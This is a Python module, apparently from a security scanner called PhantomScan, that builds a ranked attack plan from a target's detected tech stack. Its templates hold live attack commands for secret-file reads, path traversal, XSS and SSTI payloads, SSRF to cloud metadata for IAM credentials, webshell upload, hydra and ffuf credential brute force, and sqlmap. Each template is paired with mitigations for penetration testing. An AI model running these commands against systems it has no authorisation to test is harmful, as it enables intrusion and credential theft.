"""
Attack Planner — analyzes a target's tech stack and generates a prioritized
attack plan with realistic hacker commands, likelihood scores, and impact ratings.
"""

import asyncio
import logging
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx

from app.config import get_settings

logger = logging.getLogger("phantomscan.attack_planner")


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------
class Phase(str, Enum):
    RECON = "Reconnaissance"
    INITIAL_ACCESS = "Initial Access"
    PRIVILEGE_ESCALATION = "Privilege Escalation"
    LATERAL_MOVEMENT = "Lateral Movement"
    PERSISTENCE = "Persistence"
    EXFILTRATION = "Exfiltration"


class Likelihood(str, Enum):
    VERY_HIGH = "VERY_HIGH"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    VERY_LOW = "VERY_LOW"


class Impact(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class AttackStep:
    id: int
    phase: str
    attack: str
    description: str
    likelihood: str
    impact: str
    ease: str
    commands: list[str]
    modules: list[str]
    prerequisites: list[str]
    mitigations: list[str]
    references: list[str] = field(default_factory=list)
    requires: list[str] = field(default_factory=list)
    vulnerability_type: str = ""
    category: str = "general"
    priority: int = 5
    context_reason: str = ""


@dataclass
class AttackContext:
    parameters: list[str] = field(default_factory=list)
    forms: list[dict[str, Any]] = field(default_factory=list)
    api_endpoints: list[str] = field(default_factory=list)
    graphql_endpoints: list[str] = field(default_factory=list)
    file_uploads: list[str] = field(default_factory=list)
    auth_endpoints: list[str] = field(default_factory=list)
    redirect_parameters: list[str] = field(default_factory=list)
    debug_endpoints: list[str] = field(default_factory=list)
    discovered_paths: list[str] = field(default_factory=list)
    real_findings: list[dict[str, Any]] = field(default_factory=list)
    technologies: list[str] = field(default_factory=list)
    response_headers: dict[str, str] = field(default_factory=dict)


@dataclass
class TechStack:
    frameworks: list[str] = field(default_factory=list)
    servers: list[str] = field(default_factory=list)
    languages: list[str] = field(default_factory=list)
    databases: list[str] = field(default_factory=list)
    cms: list[str] = field(default_factory=list)
    cdn: list[str] = field(default_factory=list)
    waf: list[str] = field(default_factory=list)
    cloud: list[str] = field(default_factory=list)
    analytics: list[str] = field(default_factory=list)
    payment: list[str] = field(default_factory=list)
    js_libraries: list[str] = field(default_factory=list)


@dataclass
class AttackPlan:
    target: str
    tech_stack: dict[str, list[str]]
    attack_steps: list[dict[str, Any]]
    summary: dict[str, Any]
    recommended_chain: list[str]


# ---------------------------------------------------------------------------
# Technology-specific attack knowledge base
# ---------------------------------------------------------------------------
ATTACK_KB: dict[str, list[dict[str, Any]]] = {
    # Framework-specific attacks
    "django": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Django Debug Mode exploitation",
            "description": "If DEBUG=True, detailed error pages expose settings, SQL queries, and internal paths.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.HIGH,
            "ease": "Easy",
            "commands": ["curl -s '{target}/nonexistent' | grep -iE 'traceback|settings|secret'"],
            "modules": ["info_disclosure", "sensitive_exposure"],
            "prerequisites": ["DEBUG mode enabled"],
            "mitigations": ["Set DEBUG=False in production", "Configure ALLOWED_HOSTS"],
        },
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Django admin panel discovery",
            "description": "Default /admin/ path may be accessible with default credentials.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": ["curl -s '{target}/admin/' -o /dev/null -w '%{http_code}'"],
            "modules": ["access_control", "sensitive_exposure"],
            "prerequisites": ["Django admin enabled"],
            "mitigations": ["Restrict admin IP access", "Use strong credentials"],
        },
    ],
    "flask": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Flask Werkzeug debugger exploitation",
            "description": "If debugger is enabled, the interactive console allows arbitrary code execution.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.CRITICAL,
            "ease": "Medium",
            "commands": ["curl -s '{target}/console' | grep -i 'debugger'"],
            "modules": ["rce", "info_disclosure"],
            "prerequisites": ["Werkzeug debugger enabled", "PIN not set or predictable"],
            "mitigations": ["Disable debug mode", "Set a strong debugger PIN"],
        },
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Flask secret key extraction",
            "description": "Weak SECRET_KEY allows session cookie forging and privilege escalation.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.CRITICAL,
            "ease": "Medium",
            "commands": ["curl -s '{target}/' | grep -iE 'csrf|session'"],
            "modules": ["jwt", "auth_session"],
            "prerequisites": ["Weak or default SECRET_KEY"],
            "mitigations": ["Use a strong random SECRET_KEY"],
        },
    ],
    "laravel": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Laravel debug mode information leak",
            "description": "Debug mode exposes .env contents, database credentials, and app secrets.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": [
                "curl -s '{target}/' | grep -iE 'laravel|csrf_token|APP_KEY'",
                "curl -s '{target}/.env' | head -20",
            ],
            "modules": ["info_disclosure", "sensitive_exposure"],
            "prerequisites": ["APP_DEBUG=true"],
            "mitigations": ["Set APP_DEBUG=false", "Protect .env with web server rules"],
        },
        {
            "phase": Phase.EXFILTRATION,
            "attack": "Laravel .env file exposure",
            "description": "Exposed .env leaks database credentials, API keys, and APP_KEY.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": ["curl -s '{target}/.env'"],
            "modules": ["sensitive_exposure"],
            "prerequisites": [".env accessible via web"],
            "mitigations": ["Block .env in web server config"],
        },
    ],
    "spring": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Spring Boot Actuator endpoints",
            "description": "Exposed actuator endpoints (/actuator/env, /actuator/heapdump) leak sensitive data.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.HIGH,
            "ease": "Easy",
            "commands": [
                "curl -s '{target}/actuator' | python3 -m json.tool",
                "curl -s '{target}/actuator/env' | python3 -m json.tool",
                "curl -s '{target}/actuator/heapdump' -o heapdump",
            ],
            "modules": ["info_disclosure", "sensitive_exposure"],
            "prerequisites": ["Actuator enabled", "Endpoints not restricted"],
            "mitigations": ["Restrict actuator to internal network", "Disable unused endpoints"],
        },
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Spring4Shell (CVE-2022-22965)",
            "description": "Remote code execution via class loader manipulation in Spring Framework.",
            "likelihood": Likelihood.LOW,
            "impact": Impact.CRITICAL,
            "ease": "Hard",
            "commands": ["# Requires specific Spring Framework versions and JDK 9+"],
            "modules": ["rce", "injection"],
            "prerequisites": ["Spring Framework < 5.3.18", "JDK 9+", "WAR deployment"],
            "mitigations": ["Update Spring Framework to 5.3.18+"],
        },
    ],
    "express": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Express.js directory traversal",
            "description": "Misconfigured static file serving may allow path traversal.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.HIGH,
            "ease": "Easy",
            "commands": ["curl -s '{target}/../../../etc/passwd'"],
            "modules": ["path_traversal", "lfi"],
            "prerequisites": ["Static file serving misconfigured"],
            "mitigations": ["Use path.resolve() for file serving"],
        },
    ],
    "nextjs": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Next.js API route exposure",
            "description": "Server-side API routes may be accessible without authentication.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.HIGH,
            "ease": "Easy",
            "commands": [
                "curl -s '{target}/api/' | head -50",
                "curl -s '{target}/_next/data/' | head -50",
            ],
            "modules": ["api_security", "access_control"],
            "prerequisites": ["API routes without auth middleware"],
            "mitigations": ["Add authentication to all API routes"],
        },
    ],
    "wordpress": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "WordPress XML-RPC brute force",
            "description": "XML-RPC endpoint allows mass password guessing via system.multicall.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": [
                "curl -s '{target}/xmlrpc.php' -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'",
            ],
            "modules": ["auth", "rate_limiting"],
            "prerequisites": ["XML-RPC enabled"],
            "mitigations": ["Disable XML-RPC", "Implement rate limiting"],
        },
        {
            "phase": Phase.EXFILTRATION,
            "attack": "WordPress wp-config.php exposure",
            "description": "Backup or exposed wp-config.php reveals database credentials.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": [
                "curl -s '{target}/wp-config.php.bak'",
                "curl -s '{target}/wp-config.php~'",
                "curl -s '{target}/wp-config.php.old'",
            ],
            "modules": ["sensitive_exposure"],
            "prerequisites": ["Backup files accessible"],
            "mitigations": ["Remove backup files", "Block access via .htaccess"],
        },
    ],
    "nginx": [
        {
            "phase": Phase.RECON,
            "attack": "Nginx misconfiguration probing",
            "description": "Check for alias misconfiguration, path traversal via encoded slashes.",
            "likelihood": Likelihood.LOW,
            "impact": Impact.HIGH,
            "ease": "Medium",
            "commands": [
                "curl -s '{target}/%2f%2f..' -o /dev/null -w '%{http_code}'",
                "curl -s '{target}/nginx_status'",
            ],
            "modules": ["info_disclosure", "path_traversal"],
            "prerequisites": ["Nginx with alias misconfiguration"],
            "mitigations": ["Review nginx configuration", "Disable stub_status"],
        },
    ],
    "apache": [
        {
            "phase": Phase.RECON,
            "attack": "Apache server-info/server-status exposure",
            "description": "Exposed server-status and server-info pages leak internal configuration.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.MEDIUM,
            "ease": "Easy",
            "commands": [
                "curl -s '{target}/server-status' | head -50",
                "curl -s '{target}/server-info' | head -50",
            ],
            "modules": ["info_disclosure"],
            "prerequisites": ["mod_status or mod_info enabled"],
            "mitigations": ["Restrict access to server-status/info"],
        },
    ],
    "redis": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Redis unauthenticated access",
            "description": "Redis without password may allow arbitrary command execution.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": ["redis-cli -h {host} -p 6379 INFO"],
            "modules": ["access_control"],
            "prerequisites": ["Redis exposed on network", "No password set"],
            "mitigations": ["Set requirepass", "Bind to 127.0.0.1"],
        },
    ],
    "mongodb": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "MongoDB unauthenticated access",
            "description": "MongoDB without auth allows full database access.",
            "likelihood": Likelihood.LOW,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": ["mongosh --host {host} --port 27017"],
            "modules": ["access_control"],
            "prerequisites": ["MongoDB exposed", "No authentication"],
            "mitigations": ["Enable authentication", "Restrict network access"],
        },
    ],
    "mysql": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "MySQL weak credentials",
            "description": "Default or weak MySQL credentials allow database takeover.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.CRITICAL,
            "ease": "Medium",
            "commands": ["mysql -h {host} -u root -p'' -e 'SHOW DATABASES;'"],
            "modules": ["auth", "access_control"],
            "prerequisites": ["MySQL exposed on network"],
            "mitigations": ["Use strong passwords", "Restrict network access"],
        },
    ],
    "postgresql": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "PostgreSQL weak credentials",
            "description": "Default or weak PostgreSQL credentials allow database access.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.CRITICAL,
            "ease": "Medium",
            "commands": ["psql -h {host} -U postgres -c '\\l'"],
            "modules": ["auth", "access_control"],
            "prerequisites": ["PostgreSQL exposed on network"],
            "mitigations": ["Use strong passwords", "Restrict network access"],
        },
    ],
}

# Generic attacks applicable to any web target
GENERIC_ATTACKS: list[dict[str, Any]] = [
    {
        "phase": Phase.RECON,
        "attack": "Subdomain enumeration",
        "description": "Discover subdomains to find additional attack surface.",
        "likelihood": Likelihood.VERY_HIGH,
        "impact": Impact.LOW,
        "ease": "Easy",
        "commands": [
            "subfinder -d {domain} -silent",
            "amass enum -passive -d {domain}",
        ],
        "modules": [],
        "prerequisites": [],
        "mitigations": ["Monitor DNS changes", "Use private DNS"],
    },
    {
        "phase": Phase.RECON,
        "attack": "Directory brute-force",
        "description": "Discover hidden paths, admin panels, and sensitive files.",
        "likelihood": Likelihood.HIGH,
        "impact": Impact.MEDIUM,
        "ease": "Easy",
        "commands": [
            "ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403",
            "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 50",
        ],
        "modules": [],
        "prerequisites": [],
        "mitigations": ["Remove sensitive files", "Implement access controls"],
    },
    {
        "phase": Phase.RECON,
        "attack": "Sensitive file discovery",
        "description": "Check for exposed configuration files, backups, and secrets.",
        "likelihood": Likelihood.HIGH,
        "impact": Impact.HIGH,
        "ease": "Easy",
        "commands": [
            "curl -s '{target}/.env' | head -20",
            "curl -s '{target}/.git/HEAD'",
            "curl -s '{target}/robots.txt'",
            "curl -s '{target}/sitemap.xml'",
            "curl -s '{target}/.well-known/security.txt'",
        ],
        "modules": ["sensitive_exposure"],
        "prerequisites": [],
        "mitigations": ["Block sensitive files in web server config"],
    },
    {
        "phase": Phase.RECON,
        "attack": "Technology fingerprinting",
        "description": "Identify frameworks, servers, and versions from headers and body.",
        "likelihood": Likelihood.VERY_HIGH,
        "impact": Impact.INFO,
        "ease": "Easy",
        "commands": [
            "whatweb {target}",
            "wappalyzer {target}",
        ],
        "modules": [],
        "prerequisites": [],
        "mitigations": ["Remove server headers", "Use generic error pages"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "SQL Injection testing",
        "description": "Test all input parameters for SQL injection vulnerabilities.",
        "likelihood": Likelihood.MEDIUM,
        "impact": Impact.CRITICAL,
        "ease": "Medium",
        "commands": [
            "sqlmap -u '{target}/?id=1' --batch --risk=3 --level=5",
            "sqlmap -u '{target}/?q=test' --batch --dbs",
        ],
        "modules": ["sqli", "injection"],
        "prerequisites": ["SQL database backend"],
        "mitigations": ["Use parameterized queries", "Input validation"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "Cross-Site Scripting (XSS)",
        "description": "Test for reflected, stored, and DOM-based XSS vulnerabilities.",
        "likelihood": Likelihood.MEDIUM,
        "impact": Impact.HIGH,
        "ease": "Easy",
        "commands": [
            "curl '{target}/?q=<script>alert(1)</script>'",
            "curl '{target}/?name=<img src=x onerror=alert(1)>'",
        ],
        "modules": ["xss"],
        "prerequisites": ["User input reflected in page"],
        "mitigations": ["Output encoding", "Content Security Policy"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "Server-Side Request Forgery (SSRF)",
        "description": "Test for SSRF to access internal services and cloud metadata.",
        "likelihood": Likelihood.LOW,
        "impact": Impact.CRITICAL,
        "ease": "Medium",
        "commands": [
            "curl '{target}/fetch?url=http://169.254.169.254/latest/meta-data/'",
            "curl '{target}/proxy?target=http://localhost:6379/'",
        ],
        "modules": ["ssrf"],
        "prerequisites": ["URL parameter or fetch functionality"],
        "mitigations": ["URL validation", "Block internal IPs"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "Server-Side Template Injection (SSTI)",
        "description": "Test for template injection leading to remote code execution.",
        "likelihood": Likelihood.LOW,
        "impact": Impact.CRITICAL,
        "ease": "Medium",
        "commands": [
            "curl '{target}/?name={{7*7}}'",
            "curl '{target}/?name=${7*7}'",
        ],
        "modules": ["ssti"],
        "prerequisites": ["Template engine processing user input"],
        "mitigations": ["Sandbox templates", "Input validation"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "File upload vulnerabilities",
        "description": "Test for unrestricted file upload allowing webshell deployment.",
        "likelihood": Likelihood.LOW,
        "impact": Impact.CRITICAL,
        "ease": "Medium",
        "commands": [
            "curl -F 'file=@shell.php' '{target}/upload'",
            "curl -F 'file=@shell.php.jpg' '{target}/upload'",
        ],
        "modules": ["file_upload"],
        "prerequisites": ["File upload functionality"],
        "mitigations": ["Validate file types", "Store outside webroot"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "Open redirect testing",
        "description": "Test for open redirect vulnerabilities used in phishing attacks.",
        "likelihood": Likelihood.MEDIUM,
        "impact": Impact.MEDIUM,
        "ease": "Easy",
        "commands": [
            "curl -s -o /dev/null -w '%{redirect_url}' '{target}/redirect?url=https://evil.com'",
            "curl -s -o /dev/null -w '%{redirect_url}' '{target}/login?next=https://evil.com'",
        ],
        "modules": ["redirect"],
        "prerequisites": ["Redirect parameter"],
        "mitigations": ["Validate redirect targets", "Use allowlists"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "CORS misconfiguration",
        "description": "Test for overly permissive CORS allowing cross-origin data theft.",
        "likelihood": Likelihood.MEDIUM,
        "impact": Impact.HIGH,
        "ease": "Easy",
        "commands": [
            "curl -s -H 'Origin: https://evil.com' -I '{target}' | grep -i 'access-control'",
        ],
        "modules": ["cors"],
        "prerequisites": ["CORS headers present"],
        "mitigations": ["Restrict allowed origins", "Validate Origin header"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "Insecure Direct Object Reference (IDOR)",
        "description": "Test for IDOR by incrementing IDs in API endpoints.",
        "likelihood": Likelihood.MEDIUM,
        "impact": Impact.HIGH,
        "ease": "Easy",
        "commands": [
            "curl '{target}/api/users/1' -H 'Authorization: Bearer {token}'",
            "curl '{target}/api/users/2' -H 'Authorization: Bearer {token}'",
        ],
        "modules": ["access_control", "idor"],
        "prerequisites": ["API with sequential IDs"],
        "mitigations": ["Use UUIDs", "Check authorization per object"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "GraphQL introspection",
        "description": "Query GraphQL schema to discover all available types and queries.",
        "likelihood": Likelihood.HIGH,
        "impact": Impact.MEDIUM,
        "ease": "Easy",
        "commands": [
            "curl -s '{target}/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name}}}}\"}'",
        ],
        "modules": ["graphql"],
        "prerequisites": ["GraphQL endpoint exposed"],
        "mitigations": ["Disable introspection in production"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "JWT vulnerabilities",
        "description": "Test for weak JWT signing algorithms, missing expiry, and token leakage.",
        "likelihood": Likelihood.MEDIUM,
        "impact": Impact.CRITICAL,
        "ease": "Medium",
        "commands": [
            "jwt_tool {target}/api/auth -T -S hs256 -p secret",
            "curl '{target}/api/auth' -H 'Authorization: Bearer eyJ...' | python3 -m json.tool",
        ],
        "modules": ["jwt", "auth_session"],
        "prerequisites": ["JWT-based authentication"],
        "mitigations": ["Use strong signing keys", "Validate algorithm", "Set expiry"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "Rate limiting bypass",
        "description": "Test for missing rate limiting on login and sensitive endpoints.",
        "likelihood": Likelihood.HIGH,
        "impact": Impact.MEDIUM,
        "ease": "Easy",
        "commands": [
            "for i in $(seq 1 100); do curl -s -o /dev/null -w '%{http_code}\\n' '{target}/login'; done",
        ],
        "modules": ["rate_limiting", "auth"],
        "prerequisites": ["Login endpoint"],
        "mitigations": ["Implement rate limiting", "Account lockout"],
    },
    {
        "phase": Phase.INITIAL_ACCESS,
        "attack": "Cross-Site Request Forgery (CSRF)",
        "description": "Test for missing CSRF tokens in state-changing forms.",
        "likelihood": Likelihood.MEDIUM,
        "impact": Impact.HIGH,
        "ease": "Medium",
        "commands": [
            "curl -s '{target}/forms/contact' | grep -iE 'csrf|token|_token'",
        ],
        "modules": ["csrf"],
        "prerequisites": ["HTML forms present"],
        "mitigations": ["Implement CSRF tokens", "Use SameSite cookies"],
    },
    {
        "phase": Phase.PRIVILEGE_ESCALATION,
        "attack": "Environment variable extraction",
        "description": "Extract environment variables from exposed endpoints or debug pages.",
        "likelihood": Likelihood.LOW,
        "impact": Impact.CRITICAL,
        "ease": "Medium",
        "commands": [
            "curl -s '{target}/actuator/env' | python3 -m json.tool",
            "curl -s '{target}/debug/vars' | python3 -m json.tool",
        ],
        "modules": ["info_disclosure", "sensitive_exposure"],
        "prerequisites": ["Debug endpoints exposed"],
        "mitigations": ["Disable debug endpoints", "Restrict actuator access"],
    },
    {
        "phase": Phase.LATERAL_MOVEMENT,
        "attack": "Cloud metadata service access",
        "description": "Access cloud metadata endpoints to obtain IAM credentials.",
        "likelihood": Likelihood.LOW,
        "impact": Impact.CRITICAL,
        "ease": "Medium",
        "commands": [
            "curl -s 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
            "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'",
        ],
        "modules": ["ssrf"],
        "prerequisites": ["SSRF vulnerability", "Cloud environment"],
        "mitigations": ["Block metadata IPs", "Use IMDSv2"],
    },
    {
        "phase": Phase.EXFILTRATION,
        "attack": "API data exfiltration",
        "description": "Enumerate and extract data from API endpoints.",
        "likelihood": Likelihood.MEDIUM,
        "impact": Impact.HIGH,
        "ease": "Medium",
        "commands": [
            "curl '{target}/api/users?page=1&per_page=100' -H 'Authorization: Bearer {token}'",
            "curl '{target}/api/export?format=csv' -H 'Authorization: Bearer {token}'",
        ],
        "modules": ["api_security"],
        "prerequisites": ["API with data endpoints"],
        "mitigations": ["Rate limit API", "Implement pagination limits"],
    },
]

# Endpoint-specific attacks
ENDPOINT_ATTACKS: dict[str, list[dict[str, Any]]] = {
    "/graphql": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "GraphQL introspection query",
            "description": "Full schema introspection to discover all types, queries, and mutations.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.MEDIUM,
            "ease": "Easy",
            "commands": [
                "curl -s '{target}/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name,args{name,type{name}}}}}}\"}'",
            ],
            "modules": ["graphql"],
            "prerequisites": ["Introspection enabled"],
            "mitigations": ["Disable introspection in production"],
        },
        {
            "phase": Phase.EXFILTRATION,
            "attack": "GraphQL batch query abuse",
            "description": "Use batch queries to extract large amounts of data in a single request.",
            "likelihood": Likelihood.MEDIUM,
            "impact": Impact.HIGH,
            "ease": "Medium",
            "commands": [
                "curl -s '{target}/graphql' -H 'Content-Type: application/json' -d '[{\"query\":\"{users{id,email,name}}\"},{\"query\":\"{posts{id,title,content}}\"}]'",
            ],
            "modules": ["graphql", "api_security"],
            "prerequisites": ["Batch queries enabled"],
            "mitigations": ["Limit query complexity", "Disable batch queries"],
        },
    ],
    "/api": [
        {
            "phase": Phase.RECON,
            "attack": "API endpoint enumeration",
            "description": "Discover all API endpoints through documentation or brute-force.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.MEDIUM,
            "ease": "Easy",
            "commands": [
                "curl -s '{target}/api/docs' | head -50",
                "curl -s '{target}/api/swagger.json' | python3 -m json.tool",
                "curl -s '{target}/api/openapi.json' | python3 -m json.tool",
            ],
            "modules": ["api_security"],
            "prerequisites": [],
            "mitigations": ["Remove API documentation from production"],
        },
    ],
    "/admin": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Admin panel brute-force",
            "description": "Brute-force admin login with common credentials.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": [
                "ffuf -u '{target}/admin/login' -X POST -d 'username=FUZZ&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -mc 200",
            ],
            "modules": ["auth", "rate_limiting"],
            "prerequisites": ["Admin panel exists"],
            "mitigations": ["Implement MFA", "Rate limit login attempts"],
        },
    ],
    "/login": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Credential stuffing",
            "description": "Test common username/password combinations.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.CRITICAL,
            "ease": "Easy",
            "commands": [
                "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'",
            ],
            "modules": ["auth", "rate_limiting"],
            "prerequisites": ["Login form present"],
            "mitigations": ["Implement CAPTCHA", "Account lockout", "MFA"],
        },
    ],
    "/search": [
        {
            "phase": Phase.INITIAL_ACCESS,
            "attack": "Search parameter injection",
            "description": "Test search parameters for SQL injection and XSS.",
            "likelihood": Likelihood.HIGH,
            "impact": Impact.HIGH,
            "ease": "Easy",
            "commands": [
                "curl '{target}/search?q=test%27%20OR%201%3D1--'",
                "curl '{target}/search?q=<script>alert(1)</script>'",
                "sqlmap -u '{target}/search?q=test' --batch --risk=2",
            ],
            "modules": ["sqli", "xss", "injection"],
            "prerequisites": ["Search functionality"],
            "mitigations": ["Input validation", "Parameterized queries"],
        },
    ],
}


# ---------------------------------------------------------------------------
# Core planner
# ---------------------------------------------------------------------------
class AttackPlanner:
    """Generates a prioritized attack plan based on detected tech stack."""

    def __init__(self) -> None:
        self.settings = get_settings()

    async def generate_plan(
        self,
        target_url: str,
        scan_id: int | None = None,
        tech_stack: dict[str, Any] | None = None,
        open_ports: list[int] | None = None,
        findings: list[dict[str, Any]] | None = None,
        entry_points: list[dict[str, Any]] | None = None,
    ) -> AttackPlan:
        """Generate a comprehensive attack plan for a target."""
        parsed = urlparse(target_url)
        domain = parsed.hostname or target_url
        host = f"{domain}:{parsed.port}" if parsed.port else domain

        # Use provided tech stack or attempt detection
        if tech_stack is None:
            tech_stack = await self._detect_tech_stack(target_url)

        stack = self._parse_tech_stack(tech_stack)
        context = await self._build_context(target_url, stack, scan_id=scan_id, findings=findings, entry_points=entry_points)
        findings = context.real_findings

        # Build attack steps
        steps: list[AttackStep] = []
        step_id = 1

        # 1. Tech-specific attacks
        all_tech = (
            stack.frameworks + stack.servers + stack.languages +
            stack.databases + stack.cms + stack.cloud
        )
        for tech in all_tech:
            tech_lower = tech.lower().strip()
            tech_key = re.sub(r"[^a-z0-9]", "", tech_lower)
            for known_tech, attacks in ATTACK_KB.items():
                known_key = re.sub(r"[^a-z0-9]", "", known_tech)
                if known_tech in tech_lower or tech_lower in known_tech or known_key in tech_key or tech_key in known_key:
                    for attack_def in attacks:
                        step = self._build_step(step_id, attack_def, target_url, host, domain)
                        steps.append(step)
                        step_id += 1

        # 2. Generic attacks (always included)
        for attack_def in GENERIC_ATTACKS:
            step = self._build_step(step_id, attack_def, target_url, host, domain)
            steps.append(step)
            step_id += 1

        # 3. Endpoint-specific attacks
        for endpoint, attacks in ENDPOINT_ATTACKS.items():
            for attack_def in attacks:
                step = self._build_step(step_id, attack_def, target_url, host, domain)
                steps.append(step)
                step_id += 1

        # 4. Port-specific attacks
        if open_ports:
            port_attacks = self._port_based_attacks(open_ports, target_url, host)
            for attack_def in port_attacks:
                step = self._build_step(step_id, attack_def, target_url, host, domain)
                steps.append(step)
                step_id += 1

        # 5. CVE-based attacks
        if findings:
            for finding in findings[:10]:
                attack_def = self._finding_to_attack(finding, target_url)
                if attack_def:
                    step = self._build_step(step_id, attack_def, target_url, host, domain)
                    steps.append(step)
                    step_id += 1

        steps = self._filter_contextual_steps(steps, context, host)

        # Re-number
        for i, step in enumerate(steps, 1):
            step.id = i

        # Build plan
        plan = AttackPlan(
            target=target_url,
            tech_stack=tech_stack,
            attack_steps=[self._step_to_dict(s) for s in steps],
            summary=self._build_summary(steps, stack, context),
            recommended_chain=self._recommend_chain(steps),
        )
        return plan

    # ------------------------------------------------------------------
    # Tech stack detection
    # ------------------------------------------------------------------
    async def _detect_tech_stack(self, target_url: str) -> dict[str, Any]:
        """Fetch the target and detect technologies from headers and body."""
        stack: dict[str, Any] = {
            "frameworks": [],
            "servers": [],
            "languages": [],
            "databases": [],
            "cms": [],
            "cdn": [],
            "waf": [],
            "cloud": [],
            "analytics": [],
            "payment": [],
            "js_libraries": [],
        }

        try:
            async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
                resp = await client.get(target_url, headers={"User-Agent": "PhantomScan-AttackPlanner/1.0"})
                headers = {k.lower(): v for k, v in resp.headers.items()}
                body = resp.text[:100_000]

                # Server header
                server = headers.get("server", "")
                if server:
                    stack["servers"].append(server.split("/")[0].strip())

                # X-Powered-By
                powered = headers.get("x-powered-by", "").lower()
                if "express" in powered:
                    stack["frameworks"].append("Express.js")
                elif "php" in powered:
                    stack["languages"].append("PHP")
                elif "asp.net" in powered:
                    stack["frameworks"].append("ASP.NET")

                # CDN / Cloud
                if "cf-ray" in headers:
                    stack["cdn"].append("Cloudflare")
                if "x-amz-cf-id" in headers:
                    stack["cdn"].append("CloudFront")
                if "x-vercel" in headers or "x-nextjs" in headers:
                    stack["cloud"].append("Vercel")
                    stack["frameworks"].append("Next.js")
                if "x-github-request-id" in headers:
                    stack["cloud"].append("GitHub Pages")

                # Body-based detection
                body_lower = body.lower()
                detections = {
                    "react": "React",
                    "next.js": "Next.js",
                    "nextjs": "Next.js",
                    "vue.js": "Vue.js",
                    "vue": "Vue.js",
                    "angular": "Angular",
                    "jquery": "jQuery",
                    "bootstrap": "Bootstrap",
                    "tailwind": "Tailwind CSS",
                    "laravel": "Laravel",
                    "django": "Django",
                    "flask": "Flask",
                    "rails": "Ruby on Rails",
                    "spring": "Spring",
                    "wordpress": "WordPress",
                    "drupal": "Drupal",
                    "joomla": "Joomla",
                    "shopify": "Shopify",
                    "wix": "Wix",
                    "squarespace": "Squarespace",
                    "gatsby": "Gatsby",
                    "nuxt": "Nuxt.js",
                    "remix": "Remix",
                    "astro": "Astro",
                    "svelte": "Svelte",
                    "stripe": "Stripe",
                    "paypal": "PayPal",
                    "google analytics": "Google Analytics",
                    "gtag": "Google Analytics",
                    "hotjar": "Hotjar",
                    "clarity": "Microsoft Clarity",
                }
